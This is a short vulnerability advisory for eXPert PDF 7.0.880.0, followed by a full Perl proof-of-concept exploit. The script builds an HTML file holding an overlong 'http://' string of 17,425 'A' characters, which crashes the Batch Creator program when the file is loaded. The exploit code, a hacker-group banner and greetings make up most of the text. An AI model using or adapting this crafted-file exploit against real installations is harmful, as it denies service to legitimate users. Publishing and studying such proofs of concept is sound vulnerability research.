source: http://www.securityfocus.com/bid/47040/info

eXPert PDF is prone to a denial-of-service vulnerability.

Attackers can exploit this issue to cause the application to crash, denying service to legitimate users.

eXPert PDF 7.0.880.0 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl

###
# Title : eXPert PDF Batch Creator v7 Denial of Service Exploit
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows 
# Impact : Blocked 'vsbatch2pdf.exe' When Generate
# Tested on : Windows XP SP3 Fran�ais 
# Target : eXPert PDF Editor v7.0.880.0
###
# Note : BAC 2011 Enchallah ( KedAns 'me' & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# ------------
# Usage : Upload The HTML file in eXPert PDF Batch Creator (vsbatch2pdf.exe) And Start The Generate
#START SYSTEM /root@MSdos/ :
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n\n";                  
print "    |=============================================|\n";
print "    |= [!] Name : eXPert PDF Batch Creator v7    =|\n";
print "    |= [!] Exploit : Denial of Service Exploit   =|\n";
print "    |= [!] Author : KedAns-Dz                    =|\n";
print "    |= [!] Mail: Ked-h(at)hotmail(dot)com        =|\n";
print "    |=============================================|\n";
sleep(2);
print "\n";
my $junk = "http://"."\x41" x 17425;
open(file , ">", "Kedans.html"); 
print file $junk;
print "\n [+] File successfully created!\n" or die print "\n [-] OpsS! File is Not Created !! ";
close(file); 

#================[ Exploited By KedAns-Dz * HST-Dz * ]===========================================  
# Greets To : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS >
# Islampard * Zaki.Eng * Dr.Ride * Red1One * Badr0 * XoreR * Nor0 FouinY * Hani * Mr.Dak007 * Fox-Dz
# Masimovic * TOnyXED * cr4wl3r (Inj3ct0r.com) * TeX (hotturks.org) * KelvinX (kelvinx.net) * Dos-Dz
# Nayla Festa * all (sec4ever.com) Members * PLATEN (Pentesters.ir) * Gamoscu (www.1923turk.com)
# Greets to All ALGERIANS EXPLO!TER's & DEVELOPER's :=> {{
# Indoushka (Inj3ct0r.com) * [ Ma3sTr0-Dz * MadjiX * BrOx-Dz * JaGo-Dz (sec4ever.com) ] * Dr.0rYX 
# Cr3w-DZ * His0k4 * El-Kahina * Dz-Girl * SuNHouSe2 ; All Others && All My Friends . }} ,
# www.packetstormsecurity.org * exploit-db.com * bugsearch.net * 1337day.com * x000.com 
# www.metasploit.com * www.securityreason.com *  All Security and Exploits Webs ...
#================================================================================================
